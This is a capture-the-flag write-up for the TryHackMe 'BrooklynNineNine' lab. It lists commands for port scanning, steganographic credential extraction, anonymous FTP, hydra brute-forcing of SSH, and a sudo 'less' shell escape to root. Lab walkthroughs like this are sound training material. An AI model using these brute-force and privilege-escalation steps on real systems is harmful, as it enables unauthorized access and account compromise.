# BrooklynNineNine - solution
- Link: https://tryhackme.com/room/brooklynninenine
- Difficulty: `easy`

## Host recognition
- `cd nmap`
-  `nmap --open <IP> -oG scan`
 -  `extractPorts scan` (custom command) to copy open ports
- `nmap -sCV -p21,22,80 <IP> -oN ports`

## Port 80 - website recognition
- `wget http://<IP>/brooklyn99.jpg` to download the img
- `stegcracker brooklyn99.jpg` to crack the passphrase
- `steghide extract -sf brooklyn99.jpg`
- Extracted credentials, saved them in `/credentials` 

## Port 21 - ftp-anon: anonymous FTP login allowed
- `cd content`
- `ftp <IP>` (name: `anonymous`, password: `<Enter>`)
- Inside the FTP shell:
  - `get note_to_jake.txt` to download the resource
  - `cat note_to_jake.txt` 
  - Found likely users: `amy` `holt` `jake`

## Port 22 - SSH 
- `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP>`
- Cracked `jake`'s SSH password, saved in `/credentials` 
- `ssh jake@10.10.67.99` (password: `<password`)
- Inside the SSH shell:
  - `pwd` (we are into `/jake`)
  - `cd ..` to come back into `/home` folder
  - Found `/amy` `/holt` `/jake` folders
  - `cd holt`
  - `cat user.txt` 
    - Found the `USER FLAG`
  
## Privileges escalation
- Inside the SSH shell:
  - Couldn't access `/root`, so:
  - `find / -perm -4000 2>/dev/null` to find binaries with the SUID bit set
  - `sudo -l` to discover which binaries the active user can run as superuser
  - Found `/usr/bin/less`
- Checked it on https://gtfobins.github.io and found how to exploit the binary
- Inside the SSH shell:
  - `sudo less /etc/profile`
  - `!/bin/sh`
  - `whoami` to check if I became the root user 
  - `cd /root`
  - `cat root.txt` 
    - Found the `ROOT FLAG`